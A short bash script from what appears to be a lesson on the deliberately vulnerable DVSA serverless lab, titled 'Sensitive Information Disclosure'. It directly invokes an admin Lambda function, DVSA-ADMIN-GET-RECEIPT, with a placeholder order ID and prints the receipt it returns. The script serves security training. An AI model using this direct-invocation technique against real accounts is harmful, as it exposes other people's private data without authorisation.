#!/bin/bash
# Lesson 3 — Sensitive Information Disclosure
# Usage: bash run.sh

REGION="us-east-1"
OUTPUT="/tmp/receipt-response.json"

aws lambda invoke \
  --function-name DVSA-ADMIN-GET-RECEIPT \
  --payload '{"order-id":"YOUR_ORDER_ID_HERE","year":"2026","month":"04","day":"21"}' \
  --output json \
  "$OUTPUT" \
  --region "$REGION"

echo "[*] Response:"
cat "$OUTPUT"